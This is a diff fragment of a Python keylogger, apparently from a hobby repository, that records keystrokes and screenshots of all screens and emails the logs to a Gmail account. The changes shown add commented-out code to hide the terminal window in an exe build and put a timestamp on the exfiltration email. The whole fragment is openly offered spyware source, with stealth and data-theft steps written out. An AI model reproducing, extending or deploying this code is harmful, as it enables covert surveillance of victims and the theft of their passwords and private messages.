@@ -8,15 +8,14 @@ from email.mime.text import MIMEText
 import pyautogui, random, os
 from PIL import ImageGrab
 from functools import partial
-import sys
-import win32api,win32process,win32con
+#pip install pywin32
+#python -m pip install pywin32
+import win32api,win32process,win32con,win32gui,sys
 ImageGrab.grab = partial(ImageGrab.grab, all_screens=True)
 
 SEND_TIMER = 100#Time to wait before sending in seconds
 EMAIL = "@gmail.com" #EMail to which keylogs will be sent
 PASS = "************" #Set up double auth for your gmail account, and create app password
-#pip install pywin32
-#python -m pip install pywin32
 
 #---------------------------------------------------
 def highpriority():
@@ -33,6 +32,10 @@ def highpriority():
         pid = win32api.GetCurrentProcessId()
         handle = win32api.OpenProcess(win32con.PROCESS_ALL_ACCESS, True, pid)
         win32process.SetPriorityClass(handle, win32process.HIGH_PRIORITY_CLASS)
+        #Hide terminal window 
+        #Uncomment for exe build
+        #terminal_to_hide = win32gui.GetForegroundWindow()
+        #win32gui.ShowWindow(terminal_to_hide , win32con.SW_HIDE)
     else:#Apply properties to Linux and Mac
         os.nice(1)
 
@@ -93,7 +96,7 @@ class Keylogger:
         msg = MIMEMultipart("alternative")
         msg["From"] = EMAIL
         msg["To"] = EMAIL
-        msg["Subject"] = "Keylogs"
+        msg["Subject"] = f"Keylogs - {datetime.now()}"
         #Message body
         html = f"<p>Keylogger Records - {recordings}</p>"
         text_part = MIMEText(recordings, "plain")
